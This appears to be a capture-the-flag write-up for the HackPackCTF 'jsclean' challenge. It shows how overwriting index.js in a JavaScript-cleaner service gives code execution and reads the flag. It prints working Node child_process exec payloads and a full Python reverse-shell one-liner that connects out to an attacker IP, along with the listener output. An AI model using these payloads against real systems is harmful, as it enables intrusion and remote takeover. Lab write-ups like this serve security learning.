---
title: "HackPack: jsclean"
categories:
  - HackPackCTF
tags:
  - HackPackCTF
---


We're given a python script as reference, and an address to connect to:

```
import os
import sys
import subprocess


def main(argv):
    print("Welcome To JavaScript Cleaner")
    js_name = input("Enter Js File Name To Clean: ")
    code = input("Submit valid JavaScript Code: ")

    js_name = os.path.basename(js_name) # No Directory Traversal for you

    if not ".js" in js_name:
        print("No a Js File")
        return

    with open(js_name,'w') as fin:
        fin.write(code)

    p = subprocess.run(['/usr/bin/node','index.js','-f',js_name],stdout=subprocess.PIPE);
    print(p.stdout.decode('utf-8'))

main(sys.argv)
```

We can see that the script accepts a name for a .js script, as well as code for the script. It validates that .js is in the file name, and then dumps the code into the file. Then, it runs an "index.js" file using node, with the parameter -f (our file name). It's not clear what -f does, but we can infer that this is what's printing out our code in a readable format.

While testing this script, I noticed that it only accepts a one-liner, and any code that isn't on the first line is discarded.

It's also important to note that there are no restrictions to what we can name the file. You may have noticed, but if we name our file index.js, it's going to open the pre-existing file, dump our code into it, then execute it!

```
nc cha.hackpack.club 41718

Welcome To JavaScript Cleaner
Enter Js File Name To Clean: index.js
Submit valid JavaScript Code: const { exec } = require("child_process"); exec("ls -la", (error, stdout, stderr) => { if (error) { console.log(`error: ${error.message}`); return; } if (stderr) { console.log(`stderr: ${stderr}`); return; } console.log(`stdout: ${stdout}`); });
stdout: total 60
drwxr-xr-x 1 jsclean jsclean  4096 Apr 13 19:24 .
drwxr-xr-x 1 root    root     4096 Apr 13 19:24 ..
-rw-r--r-- 1 jsclean jsclean   220 May 15  2017 .bash_logout
-rw-r--r-- 1 jsclean jsclean  3526 May 15  2017 .bashrc
-rw-r--r-- 1 jsclean jsclean   675 May 15  2017 .profile
-rw-rw-r-- 1 jsclean jsclean    26 Apr 13 19:17 flag.txt
-rw-rw-r-- 1 jsclean jsclean   245 Apr 24 20:59 index.js
-rw-rw-r-- 1 jsclean jsclean   562 Apr 13 19:17 jsclean.py
drwxr-xr-x 1 jsclean jsclean  4096 Apr 13 19:24 node_modules
-rw-r--r-- 1 jsclean jsclean 11370 Apr 13 19:24 package-lock.json
-rw-rw-r-- 1 jsclean jsclean   311 Apr 13 19:17 package.json
```

We can see that flag.txt exists, so we'll run a "cat flag.txt" command to grab it:

```
nc cha.hackpack.club 41718

Welcome To JavaScript Cleaner
Enter Js File Name To Clean: index.js
Submit valid JavaScript Code: const { exec } = require("child_process"); exec("cat flag.txt", (error, stdout, stderr) => { if (error) { console.log(`error: ${error.message}`); return; } if (stderr) { console.log(`stderr: ${stderr}`); return; } console.log(`stdout: ${stdout}`); });
stdout: flag{Js_N3v3R_FuN_2_Re4d}
```

Voila, there's our flag!

**flag{Js_N3v3R_FuN_2_Re4d}**

Just for fun, we can return a reverse shell to ourselves using pentestmonkey's python reverse shell (since we know python is installed on the system):

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xx.xxx.xxx.xx\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'
```

Full code to inject:

```
const { exec } = require("child_process"); exec("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xx.xxx.xxx.xx\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", (error, stdout, stderr) => { if (error) { console.log(`error: ${error.message}`); return; } if (stderr) { console.log(`stderr: ${stderr}`); return; } console.log(`stdout: ${stdout}`); });
```

```
Listening on [0.0.0.0] (family 0, port 80)
Connection from 152.14.93.208 15270 received!
/bin/sh: 0: can't access tty; job control turned off
$ whoami
jsclean
$ 
```
